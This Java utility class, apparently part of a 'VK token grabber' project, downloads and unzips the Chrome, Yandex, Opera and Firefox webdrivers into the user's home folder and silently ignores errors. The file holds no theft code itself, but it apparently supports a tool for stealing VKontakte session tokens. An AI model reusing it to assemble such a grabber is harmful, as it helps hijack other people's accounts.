package com.github.dedinc.vktokengrabber.utils;

import java.io.File;
import java.util.ArrayList;
import java.util.Scanner;
import org.json.JSONArray;
import org.json.JSONObject;

public class WebDriver {

	static String username = System.getenv("USERNAME");

	public static void getChromeDriver() {
		try {
			String  cv = Version.getChromeVersion();
			String cdv = "";
			File temp = new File("C:\\Users\\" + username + "\\chrome.html"); 
			Downloader.download("https://chromedriver.storage.googleapis.com/", temp.getPath());
	        Scanner reader = new Scanner(temp);
	        while (reader.hasNextLine()) {
	        	cdv = cv + reader.nextLine().split("<Key>" + cv)[1].split("/")[0];
	        }
	        reader.close();
	        temp.delete();
	        String zip ="C:\\Users\\" + username + "\\chromedriver.zip";
	        Downloader.download("https://chromedriver.storage.googleapis.com/" + cdv + "/chromedriver_win32.zip", zip);	
	        Zipper.unzip(zip, "C:\\Users\\" + username);
	        new File(zip).delete();
		   } catch (Exception e) {
		}
	}

	public static void getYandexDriver() {
		String yv = Version.getYandexVersion().replace(".", "").substring(0, 4);
		ArrayList<String> ydvs = new ArrayList<String>();
		String tag = "";
		String url = "";
		JSONArray tags = new JSONArray(Request.get("https://api.github.com/repos/yandex/YandexDriver/tags"));
		for (int i = 0; i != tags.length(); i++) {
			tag = tags.getJSONObject(i).getString("name");
			ydvs.add(tag + "\n" + tag.replace("v", "").replace("-stable", "").replace(".", ""));
		}
		for (int i = 0; i != ydvs.toArray().length; i++) {
			String[] ydv = ydvs.toArray()[i].toString().split("\n");
			if (yv.equals(ydv[1])) {
				tag = ydv[0];
				break;
			}
			if (yv.substring(0, 3).equals(ydv[1].substring(0, 3))) {
				tag = ydv[0];
				break;
			}
		}
		JSONArray assets = new JSONObject(Request.get("https://api.github.com/repos/yandex/YandexDriver/releases/tags/" + tag)).getJSONArray("assets");
		for (int i = 0; i != assets.length(); i++) {
			if (assets.getJSONObject(i).getString("name").contains("win")) {
				url = assets.getJSONObject(i).getString("browser_download_url");
				break;
			}
		}
        String zip = "C:\\Users\\" + username + "\\yandexdriver.zip";
        Downloader.download(url, zip);
        Zipper.unzip(zip, "C:\\Users\\" + username);
        new File(zip).delete();
	}
	
	public static void getOperaDriver() {
		String ov = Version.getOperaVersion();
		JSONArray tags = new JSONArray(Request.get("https://api.github.com/repos/operasoftware/operachromiumdriver/tags"));
		for (int i = 0; i != tags.length(); i++) {
			String tag = tags.getJSONObject(i).getString("name");
			String release = new JSONObject(Request.get("https://api.github.com/repos/operasoftware/operachromiumdriver/releases/tags/" + tag)).getString("body");
			String name = release.split("]")[0].split("\\[")[1];
			String odv = "";
			try {
				if (name.contains("Stable")) {
					odv = name.split("Stable ")[1];
				} else {
					odv = name.split("Opera ")[1];
				}
				if (ov.equals(odv)) {
			        String zip ="C:\\Users\\" + username + "\\operadriver.zip";
			        Downloader.download("https://github.com/operasoftware/operachromiumdriver/releases/download/" + tag + "/operadriver_win32.zip", zip);	
			        Zipper.unzip(zip, "C:\\Users\\" + username);
			        new File(zip).delete();
				   }
		     	} catch (Exception e) {
			}
		}
	}
	
	public static void getFirefoxDriver() {
		String url = "";
		JSONArray assets = new JSONObject(Request.get("https://api.github.com/repos/mozilla/geckodriver/releases/latest")).getJSONArray("assets");
		for (int i = 0; i != assets.length(); i++) {
			if (assets.getJSONObject(i).getString("name").contains("win32")) {
				url = assets.getJSONObject(i).getString("browser_download_url");
				break;
			}
		}
        String zip = "C:\\Users\\" + username + "\\firefoxdriver.zip";
        Downloader.download(url, zip);
        Zipper.unzip(zip, "C:\\Users\\" + username);
        new File(zip).delete();
	}
}